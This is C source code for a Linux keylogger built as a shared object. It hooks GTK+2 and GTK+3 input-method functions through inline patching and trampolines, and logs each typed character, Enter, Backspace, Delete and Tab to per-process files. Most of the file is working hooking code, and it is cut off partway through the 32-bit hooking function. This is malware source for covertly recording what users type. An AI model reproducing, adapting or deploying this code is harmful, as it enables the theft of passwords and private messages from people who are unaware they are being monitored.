/*
 * This is the shared-object keylogger for Linux.
 *
 * Supports GTK+2 and GTK+3 on Ubuntu 16.04 LTS, 16.10 & Debian 8 with GNOME Desktop.
 * Platform is x64.
 *
 * A bit about the GTK+2 & 3:
 *
 * GTK+2 has two IMContexts for typing, so we have two logging flows, so the data is saved
 * in two files of log, with the names $progname.$TID.$PID.method1.log and method2.
 *
 * What you don't find on *method1.log is on *method2.log for some applications,
 * not depending only if they're GTK+2. I mean, not all apps made with GTK+2 are working in the same manner.
 * Some are logging well on *method1.log, and bad on *method2.log. And the opposite in some other GTK+2 apps.
 *
 * On GTK+3, there's only one flow due to the well implementation of the IMContext (Input Method)
 * with the Multicontext. So data is saved only on $progname.$TID.$PID.method1.log file.
 *
 * This keylogger also supports the special characters NewLine, BackSpace, Delete and Intro.
 * As it's a keylogger for GUI, you can't be sure if the user did a click and then Delete nor BackSpace or
 * Enter. But for some other cases yes, you can.
 *
 * Authors:
 *
 * Abel Romero Pérez aka D1W0U - abel@abelromero.com - @diw0u - http://www.abelromero.com 
 * David Reguera García aka Dreg - dreg@fr33project.org - @fr33project - http://www.fr33project.org
 *
 */


#define _GNU_SOURCE
#define __USE_GNU
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <elf.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <capstone.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <dlfcn.h>

#include "gdkkeysyms.h"

#include "kl_config.h"
#include "kl_macros.h"
#include "kl_gdkstuff.h"


/*
 * Functions that the hook handlers use from GLib.
 */

extern int g_unichar_validate(unsigned int ch);
extern int g_unichar_to_utf8(unsigned int ch,
  char *);


/*
 * Functions of the Keylogger.
 */

unsigned char *Assemble(const char *asm_code,
  size_t *opcodes_sz);

char *GetProgname();

char *GetPrognameFromLineOfStatus();

char *GetGraphicLibPathFromMaps(int *graphic_lib_type);

char *GetLibPathFromLineOfMaps(char *line);

void SaveLog(const char *logpath,
  const char *buf,
  size_t len);

int MprotectPages(unsigned long addr,
  size_t total_pages_size,
  int flags);

int HookGtkFunction(unsigned long function_addr,
  unsigned char **trampoline,
  unsigned long hook_entry,
  unsigned long hook_entry_jmp_addr);

size_t Disasm(
  void* address,
  size_t max_bytes);

/* Hook handlers */

void My_gtk_im_context_simple_commit_char(void *context,
  unsigned int ch); // GTK+2

void My_gtk_im_multicontext_commit_cb(void *slave,
  const char *str,
  void *multicontext); // GTK+2 & 3

void My_gtk_im_multicontext_filter_keypress(void *context,
  GdkEventKey *event); // GTK+2 & 3

void My_gtk_im_context_simple_filter_keypress(void *context,
  GdkEventKey *event); // GTK+2

/* GTK+2 & 3 function address gathering */

unsigned long Get_gtk3_im_multicontext_commit_cb_addr(char *);

unsigned long Get_gtk3_im_multicontext_filter_keypress_addr();

unsigned long Get_gtk2_im_multicontext_commit_cb_addr(char *);

unsigned long Get_gtk2_im_context_simple_commit_char_addr(unsigned long);

unsigned long Get_gtk2_im_context_simple_filter_keypress_addr();

unsigned long Get_gtk2_im_multicontext_filter_keypress_addr();


/*
 *  Declarations of hook entries.
 *
 * *_hook_entry ending names are the start of the hook entries.
 *
 * *_jmp_addr ending names are for seeking with MprotectPages(),
 *  because they point to the return address to be replaced.
 */

extern void gtk_im_multicontext_commit_cb_hook_entry();

extern void gtk_im_multicontext_commit_cb_hook_entry_jmp_addr();

extern void gtk_im_multicontext_filter_keypress_hook_entry();

extern void gtk_im_multicontext_filter_keypress_hook_entry_jmp_addr();

extern void gtk_im_context_simple_commit_char_hook_entry();

extern void gtk_im_context_simple_commit_char_hook_entry_jmp_addr();

extern void gtk_im_context_simple_filter_keypress_hook_entry();

extern void gtk_im_context_simple_filter_keypress_hook_entry_jmp_addr();

/*
 * Declarations of hook entries for x86
 */

extern void gtk_im_multicontext_commit_cb_hook_entry_x86();

extern void gtk_im_multicontext_filter_keypress_hook_entry_x86();

extern void gtk_im_context_simple_commit_char_hook_entry_x86();

extern void gtk_im_context_simple_filter_keypress_hook_entry_x86();


/*
 * Global variables.
 */

char *progname = NULL;


/*
 * Shared-Object constructor & destructor.
 */

 void __attribute__((constructor)) init()
 {

   printf("hello from keylogger.so init() constructor\n");

   unsigned long gtk_im_multicontext_commit_cb_addr = 0,
     gtk_im_multicontext_filter_keypress_addr = 0,
     gtk_im_context_simple_commit_char_addr = 0,
     gtk_im_context_simple_filter_keypress_addr = 0;

   unsigned char *trampoline1 = NULL,
     *trampoline2 = NULL,
     *trampoline3 = NULL,
     *trampoline4 = NULL;

   char *graphic_lib_path;

   int graphic_lib_type;


   progname = GetProgname();

   graphic_lib_path = GetGraphicLibPathFromMaps(&graphic_lib_type);

   if (graphic_lib_path != NULL)
   {

     if (graphic_lib_type == GRAPHIC_LIB_GTK3)
     {
       gtk_im_multicontext_commit_cb_addr = Get_gtk3_im_multicontext_commit_cb_addr(graphic_lib_path);

       gtk_im_multicontext_filter_keypress_addr = Get_gtk3_im_multicontext_filter_keypress_addr();

       free(graphic_lib_path);

       if (gtk_im_multicontext_commit_cb_addr != -1
         && gtk_im_multicontext_filter_keypress_addr != -1)
       {
           HookGtkFunction(gtk_im_multicontext_commit_cb_addr,
             &trampoline1,
             (unsigned long)gtk_im_multicontext_commit_cb_hook_entry,
             (unsigned long)gtk_im_multicontext_commit_cb_hook_entry_jmp_addr);

           HookGtkFunction(gtk_im_multicontext_filter_keypress_addr,
             &trampoline2,
             (unsigned long)gtk_im_multicontext_filter_keypress_hook_entry,
             (unsigned long)gtk_im_multicontext_filter_keypress_hook_entry_jmp_addr);
       }

     }
     else if (graphic_lib_type == GRAPHIC_LIB_GTK2)
     {

         gtk_im_multicontext_commit_cb_addr = Get_gtk2_im_multicontext_commit_cb_addr(graphic_lib_path);

         free(graphic_lib_path);

         gtk_im_context_simple_filter_keypress_addr = Get_gtk2_im_context_simple_filter_keypress_addr();

         gtk_im_context_simple_commit_char_addr
          = Get_gtk2_im_context_simple_commit_char_addr(gtk_im_context_simple_filter_keypress_addr);

         gtk_im_multicontext_filter_keypress_addr = Get_gtk2_im_multicontext_filter_keypress_addr();

       if (gtk_im_multicontext_commit_cb_addr != -1
         && gtk_im_context_simple_commit_char_addr != -1
         && gtk_im_context_simple_filter_keypress_addr != -1
         && gtk_im_multicontext_filter_keypress_addr != -1)
       {

           HookGtkFunction(gtk_im_multicontext_commit_cb_addr,
             &trampoline1,
             (unsigned long)gtk_im_multicontext_commit_cb_hook_entry,
             (unsigned long)gtk_im_multicontext_commit_cb_hook_entry_jmp_addr);

           HookGtkFunction(gtk_im_multicontext_filter_keypress_addr,
             &trampoline2,
             (unsigned long)gtk_im_multicontext_filter_keypress_hook_entry,
             (unsigned long)gtk_im_multicontext_filter_keypress_hook_entry_jmp_addr);

           HookGtkFunction(gtk_im_context_simple_commit_char_addr,
             &trampoline3,
             (unsigned long)gtk_im_context_simple_commit_char_hook_entry,
             (unsigned long)gtk_im_context_simple_commit_char_hook_entry_jmp_addr);

           HookGtkFunction(gtk_im_context_simple_filter_keypress_addr,
             &trampoline4,
             (unsigned long)gtk_im_context_simple_filter_keypress_hook_entry,
             (unsigned long)gtk_im_context_simple_filter_keypress_hook_entry_jmp_addr);

       }

     }
     else if (graphic_lib_type == GRAPHIC_LIB_QT)
     {
     }

   }
   else
   {

     fprintf(stderr, "graphic library not found on maps!\n");

     return;
   }
 }

 void __attribute__((destructor)) vexit()
 {

   printf("good bye from keylogger.so vexit() destructor\n");

 }

/*
 * Function definitions.
 */

// From DbgChild.
#ifdef __x86_64__

  size_t GetBytesInstructionsReplaced(
      void* address,
      size_t bytes_to_replaced,
      size_t max_bytes)
  {
      csh handle = 0;
      cs_insn* insn;
      size_t count;
      size_t total_bytes = 0;

      if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) == CS_ERR_OK)
      {
          count = cs_disasm(handle, (uint8_t *) address, max_bytes, (unsigned long) address, 0,
              &insn);

          printf("Disasm count: %d\n", (int)count);
          if (count > 0)
          {
              size_t j, k;
              for (j = 0; j < count; j++)
              {
                  printf("0x%" PRIXPTR " - ", (uintptr_t)insn[j].address);

                  for (k = 0; k < insn[j].size; k++)
                  {
                      printf("0x%02X ", (int)((insn[j]).bytes[k]));
                  }

                  printf("- %s %s (%d bytes)\n", insn[j].mnemonic, insn[j].op_str, (int)(insn[j].size));

                  total_bytes += insn[j].size;

                  if (total_bytes >= bytes_to_replaced)
                  {
                      printf("Total bytes: %ld\n", total_bytes);

                      break;
                  }
              }

              cs_free(insn, count);

          }
          else
          {
              fprintf(stderr, "Error Disas Library\n");
          }
          cs_close(&handle);
      }
      else
      {
          fprintf(stderr, "Error Openning Disas Library\n");
      }

      return total_bytes;
  }

#else

  size_t GetBytesInstructionsReplaced(
      void* address,
      size_t *bytes_to_replaced,
      size_t max_bytes)
  {
      csh handle = 0;
      cs_insn* insn;
      size_t count;
      size_t total_bytes = 0;

      if (cs_open(CS_ARCH_X86, CS_MODE_32, &handle) == CS_ERR_OK)
      {
          count = cs_disasm(handle, (uint8_t *) address, max_bytes, (unsigned long) address, 0,
              &insn);

          printf("Disasm count: %d\n", (int)count);
          if (count > 0)
          {
              size_t j, k;
              for (j = 0; j < count; j++)
              {
                  printf("0x%" PRIXPTR " - ", (uintptr_t)insn[j].address);

                  for (k = 0; k < insn[j].size; k++)
                  {
                      printf("0x%02X ", (int)((insn[j]).bytes[k]));
                  }

                  printf("- %s %s (%d bytes)\n", insn[j].mnemonic, insn[j].op_str, (int)(insn[j].size));

                  total_bytes += insn[j].size;

                  // we need to augment the replace bytes when we have a call in x86 due to the need of the rebuilding of the call,
                  // because we use an ASM trick with the absolute address.
                  // And I need to reference the next address in the disasm to make the address absolute with the call's offset.
                  if (strlen(insn[j].mnemonic) == 4
                    && strncmp(insn[j].mnemonic, "call", 4) == 0)
                  {
                    *bytes_to_replaced += insn[j].size;
                  }

                  if (total_bytes >= *bytes_to_replaced)
                  {
                      printf("Total bytes: %d\n", total_bytes);
                      break;
                  }
              }

              cs_free(insn, count);

          }
          else
          {
              fprintf(stderr, "Error Disas Library\n");
          }
          cs_close(&handle);
      }
      else
      {
          fprintf(stderr, "Error Openning Disas Library\n");
      }

      return total_bytes;
  }

#endif

size_t Disasm(
    void* address,
    size_t max_bytes)
{
    csh handle = 0;
    cs_insn* insn;
    size_t count;
    cs_mode actual_cs_mode;

#ifdef __x86_64__
    actual_cs_mode = CS_MODE_64;
#else
    actual_cs_mode = CS_MODE_32;
#endif

    if (cs_open(CS_ARCH_X86, actual_cs_mode, &handle) == CS_ERR_OK)
    {
        count = cs_disasm(handle, (uint8_t*)address, max_bytes, (unsigned long) address, 0,
            &insn);

        printf("Disasm count: %d\n", (int)count);
        if (count > 0)
        {
            size_t j, k;
            for (j = 0; j < count; j++)
            {
                printf("0x%" PRIXPTR " - ", (uintptr_t)insn[j].address);

                for (k = 0; k < insn[j].size; k++)
                {
                    printf("0x%02X ", (int)((insn[j]).bytes[k]));
                }
                printf("- %s %s (%d bytes)\n", insn[j].mnemonic, insn[j].op_str, (int)(insn[j].size));
            }

            cs_free(insn, count);

        }
        else
        {
            fprintf(stderr, "Error Disas Library\n");
        }
        cs_close(&handle);
    }
    else
    {
        fprintf(stderr, "Error Openning Disas Library\n");
    }

    return 0;
}

/*
 * Given a line of the /proc/self|<pid>/maps it extracts the complete path of the library.
 */
char *GetLibPathFromLineOfMaps(char *line)
{
  int i, lib_path_sz;
  char *lib_path = NULL;

   // un decremento en i, cuenta al inicio de la ruta.
  for (i = strlen(line) - 1, lib_path_sz = 0; i > 0; i --)
  {

    if (line[i] == ' ')
    {

      break;

    }

    lib_path_sz++;
  }

  lib_path = calloc(lib_path_sz, sizeof(char));

  // lib_path_sz - 1 porque le quitamos el \n.
  for (i = 0; i < lib_path_sz - 1; i++)
  {

    lib_path[i] = line[strlen(line) - lib_path_sz + i];

  }

  //printf("%s\n", lib_path);

  return lib_path;
}

char *GetGraphicLibPathFromMaps(int *graphic_lib_type)
{
  FILE *fh;
  char line[512], *lib_path;

  // this file can't be mapped as it's the maps file ;)
  fh = fopen("/proc/self/maps", "r");
  if (fh == NULL)
  {
    perror("fopen()");
    return NULL;
  }

  while (fgets(line, sizeof(line), fh) != NULL)
  {
    if (strstr(line, "libgtk-x11-2.0.so.0") != NULL)
    {
      printf("GTKv2 found!\n");
      lib_path = GetLibPathFromLineOfMaps(line);
      *graphic_lib_type = GRAPHIC_LIB_GTK2;
      fclose(fh);
      return lib_path;
    }
    else if (strstr(line, "libgtk-3.so.0") != NULL)
    {
      printf("GTKv3 found!\n");
      lib_path = GetLibPathFromLineOfMaps(line);
      *graphic_lib_type = GRAPHIC_LIB_GTK3;
      fclose(fh);
      return lib_path;
    }
  }

  return NULL;
}

// parse the program name from /proc/self/status
char *GetPrognameFromLineOfStatus(char *line)
{
  int i, name_sz;
  char *name = NULL;

   // un decremento en i, cuenta al inicio de la ruta.
  for (i = strlen(line) - 1, name_sz = 0; i > 0; i --)
  {
    if (line[i] == '\t')
    {
      break;
    }
    name_sz++;
  }

  name = calloc(name_sz, sizeof(char));

  // name - 1 porque le quitamos el \n.
  for (i = 0; i < name_sz - 1; i++)
  {
    name[i] = line[strlen(line) - name_sz + i];
  }
  printf("%s\n", name);
  return name;
}

// returns the binary name of the current process.
char *GetProgname()
{
  FILE *fh;
  char line[100], *name;

  fh = fopen("/proc/self/status", "r");
  if (fh == NULL)
  {
    perror("fopen()");
    return NULL;
  }

  // read first line where the name is.
  if (fgets(line, sizeof(line), fh) != NULL)
  {
    name = GetPrognameFromLineOfStatus(line);
    fclose(fh);
    return name;
  }

  fclose(fh);
  return NULL;
}

// logging routine method 1
// GTK+2 and 3
void My_gtk_im_multicontext_commit_cb (void *slave, const char *str, void *multicontext)
{
  pid_t pid;
  pid_t tid;
  char log_fname[255];

  printf("hello from the hook!\n");

  pid = getpid();
  tid = syscall(SYS_gettid);
  snprintf(log_fname, sizeof(log_fname), KLCFG_LOGPATH"/%s.%d.%d.method1.log", progname, pid, tid);

  SaveLog(log_fname, str, strlen(str));
}

// logging routine method 2
// GTK+2
void My_gtk_im_context_simple_commit_char(void *context, unsigned int ch)
{
  int len;
  pid_t pid;
  pid_t tid;
  char log_fname[255];
  char buf[10];

  printf("hello from the hook 2!\n");

  if (!g_unichar_validate(ch))
  {
    return;
  }

  len = g_unichar_to_utf8 (ch, buf);
  buf[len] = '\0';

  pid = getpid();
  tid = syscall(SYS_gettid);
  snprintf(log_fname, sizeof(log_fname), KLCFG_LOGPATH"/%s.%d.%d.method2.log", progname, pid, tid);

  SaveLog(log_fname, buf, len);
}

void My_gtk_im_multicontext_filter_keypress(void *context, GdkEventKey *event)
{

  pid_t pid;
  pid_t tid;
  char logpath[255];

  printf("hello from the hook 3!\n");

  pid = getpid();
  tid = syscall(SYS_gettid);
  snprintf(logpath, sizeof(logpath), KLCFG_LOGPATH"/%s.%d.%d.method1.log", progname, pid, tid);

  if (event->type == GDK_KEY_PRESS)
  {
    if (event->keyval == GDK_KEY_BackSpace)
    {
      SaveLog(logpath, "\x08", 1);
    }
    else if (GDK_KEY_Return == event->keyval
      || GDK_KEY_KP_Enter == event->keyval
      || GDK_KEY_ISO_Enter == event->keyval)
    {
      SaveLog(logpath, "\n", 1);
    }
    else if (GDK_KEY_Delete == event->keyval
      || GDK_KEY_KP_Delete == event->keyval)
    {
      SaveLog(logpath, "\x7f", 1);
    }
    else if (GDK_KEY_Tab == event->keyval
      || GDK_KEY_KP_Tab == event->keyval
      || GDK_KEY_ISO_Left_Tab == event->keyval)
    {
      SaveLog(logpath, "\t", 1);
    }
  }
}

void My_gtk_im_context_simple_filter_keypress(void *context, GdkEventKey *event)
{
  pid_t pid;
  pid_t tid;
  char logpath[255];

  printf("hello from the hook 4!\n");

  pid = getpid();
  tid = syscall(SYS_gettid);
  snprintf(logpath, sizeof(logpath), KLCFG_LOGPATH"/%s.%d.%d.method2.log", progname, pid, tid);

  if (event->type == GDK_KEY_PRESS)
  {
    if (event->keyval == GDK_KEY_BackSpace)
    {
      SaveLog(logpath, "\x08", 1);
    }
    else if (GDK_KEY_Return == event->keyval
      || GDK_KEY_KP_Enter == event->keyval
      || GDK_KEY_ISO_Enter == event->keyval)
    {
      SaveLog(logpath, "\n", 1);
    }
    else if (GDK_KEY_Delete == event->keyval
      || GDK_KEY_KP_Delete == event->keyval)
    {
      SaveLog(logpath, "\x7f", 1);
    }
    else if (GDK_KEY_Tab == event->keyval
      || GDK_KEY_KP_Tab == event->keyval
      || GDK_KEY_ISO_Left_Tab == event->keyval)
    {
      SaveLog(logpath, "\t", 1);
    }
  }
}


void SaveLog(const char *logpath, const char *buf, size_t len) {
  FILE *fh;

  fh = fopen(logpath, "a");

  if (fh != NULL)
  {
    if (ftell(fh) == 0)
    {
      // insert UTF-8 BOM on the file's header
      fwrite("\xEF\xBB\xBF", sizeof(char), 3, fh);
    }

    fwrite(buf, sizeof(char), len, fh);

    fclose(fh);
  }
  else
  {
    perror("fopen()");
  }
}

// uses pipe to assemble with a modified kstool from keystone engine to generate bytetocode
// and be able to hook correctly.
unsigned char *Assemble(const char *asm_code, size_t *opcodes_sz)
{
  FILE *fp;

  char a_opcode[5],
    cmd[255],
    *ld_preload_env;

  unsigned char *opcodes = NULL;

  int i;

  size_t bytecode_sz;


#ifdef __x86_64__
  snprintf(cmd, sizeof(cmd), KLCFG_KSTOOL" x64 \"%s\"", asm_code);
#else
  snprintf(cmd, sizeof(cmd), KLCFG_KSTOOL" x32 \"%s\"", asm_code);
#endif

  // prevent popen() stucks the execution in the case another malware uses LD_PRELOAD or the user.
  ld_preload_env = getenv("LD_PRELOAD");
  unsetenv("LD_PRELOAD");

  fp = popen(cmd, "r");
  if (fp == NULL)
  {
    fprintf(stderr, "Failed to run command\n");
    return NULL;
  }

  bytecode_sz = 0;
  while(fgets(a_opcode, sizeof(a_opcode), fp) != NULL)
  {
    opcodes = realloc(opcodes, bytecode_sz + 1);
    if (opcodes == NULL)
    {
      return NULL;
    }

    opcodes[bytecode_sz] = strtol(a_opcode, NULL, 16);
    bytecode_sz ++;
  }

  *opcodes_sz = bytecode_sz;
  for (i = 0; i < bytecode_sz; i++) {
    printf("%x ", opcodes[i]);
    fflush(stdout);
  }
  printf("\n");

  pclose(fp);

  if (ld_preload_env != NULL)
  {
    setenv("LD_PRELOAD", ld_preload_env, 0);
  }

  return opcodes;
}

// changes the protection of the up and down pages of the address passed
int MprotectPages(unsigned long address,
  size_t code_size,
  int flags)
{

  int total_pages_size = (PAGE_ROUND_UP(address + (code_size - 1)) - PAGE_ROUND_DOWN(address));

  if (mprotect((void *)PAGE_ROUND_DOWN(address), total_pages_size, flags) != 0)
  {

    perror("mprotect()");

    return -1;

  }

  return 0;
}

// generic routine to hook gtk methods, maybe also useful to hook any without prologue.
#ifdef __x86_64__

  int HookGtkFunction(unsigned long function_addr,
    unsigned char **trampoline,
    unsigned long hook_entry,
    unsigned long hook_entry_addr)
  {

    unsigned long my_addr,
      rip_rel_off;

    unsigned char nop = 0x90,
      *rip_rel_rebuild = NULL;

    unsigned int i, bytes_rep;

    csh cs_handle;

    cs_insn *insn;

    size_t cs_count,
      rip_rel_rebuild_sz,
      trampoline_sz = 0;

    char *prip_rel_reg,
      rip_rel_reg[4],
      rip_rel_asm[100];

    void *mem;

    /*
     * Testing of RIP-Relative rebuilding logics
     */
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; lea rsi, qword ptr [rip + 0x1d1c3b]", &rip_rel_rebuild_sz);
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; lea rsi, qword ptr [rip - 0x1d1c3b]", &rip_rel_rebuild_sz);
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; push qword ptr [rip + 0x1d1c3b]; nop; nop; nop", &rip_rel_rebuild_sz);
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; push qword ptr [rip - 0x1d1c3b]; nop; nop; nop", &rip_rel_rebuild_sz);
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; mov rsi, qword ptr [rip + 0x1d1c3b]", &rip_rel_rebuild_sz);
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; mov rsi, qword ptr [rip - 0x1d1c3b]", &rip_rel_rebuild_sz);
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; mov qword ptr [rip + 0x1d1c3b], rsi", &rip_rel_rebuild_sz);
    //rip_rel_rebuild = assemble("mov rdi, rdx; mov rdx, rsi; mov qword ptr [rip - 0x1d1c3b], rsi", &rip_rel_rebuild_sz);
    //memcpy((void *)faddr, rip_rel_rebuild, rip_rel_rebuild_sz);

    //disasm(assemble("push rax; mov rax, 0x1010101010101010; jmp rax; pop rax", &rip_rel_rebuild_sz), rip_rel_rebuild_sz);

    bytes_rep = GetBytesInstructionsReplaced((void *)function_addr,
      HOOK_PATCH_SZ,
      HOOK_PATCH_SZ * 2);

    if (cs_open(CS_ARCH_X86,
      CS_MODE_64,
      &cs_handle) != CS_ERR_OK)
    {

      fprintf(stderr, "cs_open()");

      return -1;
    }

    cs_count = cs_disasm(cs_handle,
      (void *)function_addr,
      bytes_rep,
      function_addr,
      0,
      &insn);

    if (cs_count <= 0)
    {

      fprintf(stderr, "cs_disasm()\n");

      cs_close(&cs_handle);

      return -1;
    }

    //printf("disasm of function to hook:\n");
    //disasm((void *) faddr, HOOK_PATCH_SZ * 2);

    //disasm(assemble("mov rax, qword ptr [rip + 0x1000]", &rip_rel_rebuild_sz), 12);
    //disasm(assemble("mov qword ptr [rip + 0x1000], rax", &rip_rel_rebuild_sz), 12);
    //disasm(assemble("push qword ptr [rip + 0x1000]", &rip_rel_rebuild_sz), 12);
    for (i = 0; i < cs_count; i++)
    {
      if (strlen(insn[i].mnemonic) == 3
        && strncmp(insn[i].mnemonic, "lea", 3) == 0
        && strstr(insn[i].op_str, "rip") != NULL)
      {
        // rebuild lea rip-relative: disasm the trampoline's opcodes and search for lea rip relative.
        // then as there's only 2gb space for relative lea we must do a mov into register with absolute address.
        //printf("0x%"PRIx64":\t%s\t\t%s\t%d\n", insn[i].address, insn[i].mnemonic, insn[i].op_str, insn[i].size);

        prip_rel_reg = strchr(insn[i].op_str, ',');

        memcpy(rip_rel_reg, insn[i].op_str,
          (unsigned long)prip_rel_reg - (unsigned long)insn[i].op_str);

        rip_rel_reg[3] = 0;

        rip_rel_off = insn[i].bytes[3]
          | (insn[i].bytes[4] << 8)
          | (insn[i].bytes[5] << 16)
          | (insn[i].bytes[6] << 24);

        if (strchr(insn[i].op_str, '+') != NULL)
        {
          snprintf(rip_rel_asm, sizeof(rip_rel_asm), "mov %s, 0x%lx", rip_rel_reg, rip_rel_off + insn[i].address + insn[i].size);

          printf("lea rip-relative is positive\n");
        }
        else if (strchr(insn[i].op_str, '-') != NULL)
        {

          snprintf(rip_rel_asm,
            sizeof(rip_rel_asm),
            "mov %s, 0x%lx",
            rip_rel_reg,
            insn[i].address + insn[i].size - rip_rel_off);

          printf("lea rip-relative is negative\n");
        }

        //printf("%s\n", rip_rel_asm);

        rip_rel_rebuild = Assemble(rip_rel_asm, &rip_rel_rebuild_sz);

        if (rip_rel_rebuild == NULL) {
          return -1;
        }

        *trampoline = (unsigned char *)realloc(*trampoline,
          trampoline_sz + rip_rel_rebuild_sz);

        if (*trampoline == NULL) {
          return -1;
        }

        memcpy(*trampoline + trampoline_sz,
          rip_rel_rebuild,
          rip_rel_rebuild_sz);

        free(rip_rel_rebuild);

        trampoline_sz += rip_rel_rebuild_sz;
      }
      else if (strlen(insn[i].mnemonic) == 3
        && strncmp(insn[i].mnemonic, "mov", 3) == 0
        && strstr(insn[i].op_str, "rip") != NULL)
        {
          /*
          teniendo:
          mov qword ptr [rip + 0x1000], rsi
          sería:
          push rax
          mov rax, offset
          mov [rax], rsi
          pop rax

          y teniendo:
          mov rsi, qword ptr [rip + 0x1000]
          sería:
          push rax
          mov rax, offset
          mov rsi, [rax]
          pop rax
          */

          // calculate rip-relative address
          rip_rel_off = insn[i].bytes[3]
            | (insn[i].bytes[4] << 8)
            | (insn[i].bytes[5] << 16)
            | (insn[i].bytes[6] << 24);

          if (strchr(insn[i].op_str, '+') != NULL)
          {
            rip_rel_off = rip_rel_off + insn[i].address + insn[i].size;
            printf("mov rip-relative is positive\n");
          }
          else if (strchr(insn[i].op_str, '-') != NULL)
          {
            rip_rel_off = insn[i].address + insn[i].size - rip_rel_off;
            printf("mov rip-relative is negative\n");
          }

          // find register side and compose asm code
          if ((prip_rel_reg = strtok(insn[i].op_str, ",")) == NULL)
          {

            fprintf(stderr, "strtok() error\n");
            return -1;
          }

          if (strlen(prip_rel_reg) == 3)
          {
            // if value is moved from rip-relative addr to register:

            snprintf(rip_rel_asm,
              sizeof(rip_rel_asm),
              "push rax; mov rax, 0x%lx; mov %s, [rax]; pop rax",
              rip_rel_off, prip_rel_reg);
          }
          else
          {
            // if register's value is moved to rip-relative address:

            prip_rel_reg = insn[i].op_str + strlen(prip_rel_reg) + 2; // más 2: la coma y el espacio.
            snprintf(rip_rel_asm,
              sizeof(rip_rel_asm),
              "push rax; mov rax, 0x%lx; mov [rax], %s; pop rax",
              rip_rel_off, prip_rel_reg);
          }

          printf("%s\n", rip_rel_asm);

          // build trampoline with rip-relative asm opcodes
          rip_rel_rebuild = Assemble(rip_rel_asm, &rip_rel_rebuild_sz);

          if (rip_rel_rebuild == NULL) {
            return -1;
          }

          *trampoline = (unsigned char *)realloc(*trampoline,
            trampoline_sz + rip_rel_rebuild_sz);

          if (*trampoline == NULL) {
            return -1;
          }

          memcpy(*trampoline + trampoline_sz,
            rip_rel_rebuild,
            rip_rel_rebuild_sz);

          free(rip_rel_rebuild);

          trampoline_sz += rip_rel_rebuild_sz;

      } else if (strlen(insn[i].mnemonic) == 4
        && strncmp(insn[i].mnemonic, "push", 4) == 0
        && strstr(insn[i].op_str, "rip") != NULL)
      {

        rip_rel_off = insn[i].bytes[2] | (insn[i].bytes[3] << 8) | (insn[i].bytes[4] << 16) | (insn[i].bytes[5] << 24);
        if (strchr(insn[i].op_str, '+') != NULL) {
          rip_rel_off = rip_rel_off + insn[i].address + insn[i].size;
          printf("push rip-relative is positive\n");
        } else if (strchr(insn[i].op_str, '-') != NULL) {
          rip_rel_off = insn[i].address + insn[i].size - rip_rel_off;
          printf("push rip-relative is negative\n");
        }

        *trampoline = (unsigned char *)realloc(*trampoline,
          trampoline_sz + PUSH_RIP_REL_SZ);

        if (*trampoline == NULL) {
          return -1;
        }

        memcpy(*trampoline + trampoline_sz,
          PUSH_RIP_REL,
          PUSH_RIP_REL_SZ);

        memcpy(*trampoline + trampoline_sz + 3,
          &rip_rel_off,
          sizeof(rip_rel_off));

        trampoline_sz += PUSH_RIP_REL_SZ;
      } else {

        // append non rip-relative opcodes

        *trampoline = realloc(*trampoline, trampoline_sz + insn[i].size);

        if (*trampoline == NULL) {
          return -1;
        }

        memcpy(*trampoline + trampoline_sz,
          insn[i].bytes,
          insn[i].size);

        trampoline_sz += insn[i].size;
      }
    }

    cs_free(insn, cs_count);
    cs_close(&cs_handle);

    *trampoline = realloc(*trampoline,
      trampoline_sz + TRAMPOLINE_EPILOGUE_SZ);

    if (*trampoline == NULL) {
      return -1;
    }

    memcpy(*trampoline + trampoline_sz,
      TRAMPOLINE_EPILOGUE,
      TRAMPOLINE_EPILOGUE_SZ);

    my_addr = function_addr;
    my_addr += bytes_rep - (bytes_rep - HOOK_PATCH_SZ) - 1; // menos los nops y el pop rax

    memcpy(*trampoline + trampoline_sz + 3,
      &my_addr,
      sizeof(my_addr));

    trampoline_sz += TRAMPOLINE_EPILOGUE_SZ;

    // by default, calloc()'ed memmory areas are not executable,
    // so we leave that page with RWX protection. W because internally
    // writes are done outside our area.
    if (MprotectPages((unsigned long)*trampoline,
      trampoline_sz,
      PROT_EXEC | PROT_READ | PROT_WRITE) != 0) {

      return -1;
    }

    //printf("disasm of trampoline:\n");
    //disasm(*trampoline, trampoline_sz);

    if ((mem = memmem((void *)hook_entry,
      0x200,
      "\xbe\xba\xad\xde\xbe\xba\xad\xde",
      8)) == NULL) {

      fprintf(stderr, "address into hook_entry not found!\n");
      return -1;
    }

    if (MprotectPages(hook_entry_addr,
      8,
      PROT_EXEC | PROT_READ | PROT_WRITE) != 0) {

      return -1;
    }

    my_addr = (unsigned long)*trampoline;
    memcpy(mem, &my_addr, sizeof(my_addr));

    if (MprotectPages(
      hook_entry_addr,
      8,
      PROT_EXEC | PROT_READ) != 0) {

      return -1;
    }

    // prepare function to hook with rwp perms to patch it.
    if (MprotectPages(function_addr,
      HOOK_PATCH_SZ,
      PROT_EXEC | PROT_READ | PROT_WRITE) != 0) {

      return -1;
    }

    memcpy((void *)function_addr,
      HOOK_PATCH,
      HOOK_PATCH_SZ);

    memcpy((void *)(function_addr + 3),
      &hook_entry,
      sizeof(hook_entry));

    for (i = 0; i < bytes_rep - HOOK_PATCH_SZ; i++) {

      memcpy((void *)(function_addr + HOOK_PATCH_SZ + i),
        &nop,
        1);
    }

    if (MprotectPages(function_addr,
      HOOK_PATCH_SZ,
      PROT_EXEC | PROT_READ) != 0) {

      return -1;
    }

    //printf("disasm of function hooked:\n");
    //disasm((void *) faddr, HOOK_PATCH_SZ * 2);

    return 0;
  }

#else

  int HookGtkFunction(unsigned long function_addr,
    unsigned char **trampoline,
    unsigned long hook_entry,
    unsigned long hook_entry_addr)
  {
    unsigned long my_addr;

    unsigned char nop = 0x90,
      *asm_opcodes;

    char asm_code[30];

    unsigned int i, bytes_rep;

    csh cs_handle;

